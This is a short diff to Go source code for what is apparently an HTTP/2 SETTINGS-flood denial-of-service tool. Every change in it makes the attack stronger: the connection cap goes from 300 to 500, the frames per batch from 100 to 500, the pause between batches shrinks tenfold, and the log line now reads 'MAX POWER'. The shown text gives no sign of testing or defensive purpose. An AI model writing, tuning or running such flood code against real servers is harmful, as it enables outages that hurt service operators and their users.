@@ -36,11 +36,11 @@ func runSettingsFlood(cfg *AttackConfig) {
 	if connCount < 50 {
 		connCount = 50
 	}
-	if connCount > 300 {
-		connCount = 300
+	if connCount > 500 {
+		connCount = 500
 	}
 
-	log.Printf("HTTP/2 SETTINGS Flood: %d parallel H2 connections to %s:%s", connCount, host, port)
+	log.Printf("HTTP/2 SETTINGS Flood: %d parallel H2 connections to %s:%s (MAX POWER)", connCount, host, port)
 
 	var wg sync.WaitGroup
 	for i := 0; i < connCount; i++ {
@@ -133,7 +133,7 @@ func settingsFloodConn(host, port string, deadline time.Time) error {
 		}
 
 		// Send batch of SETTINGS frames with VARYING values (no caching)
-		for i := 0; i < 100; i++ {
+		for i := 0; i < 500; i++ {
 			err := framer.WriteSettings(
 				http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000 + settingsCount},
 				http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65536 + settingsCount*10},
@@ -151,7 +151,7 @@ func settingsFloodConn(host, port string, deadline time.Time) error {
 			settingsCount++
 		}
 
-		time.Sleep(time.Millisecond)
+		time.Sleep(100 * time.Microsecond)
 	}
 
 	framer.WriteGoAway(0, http2.ErrCodeNo, []byte{})
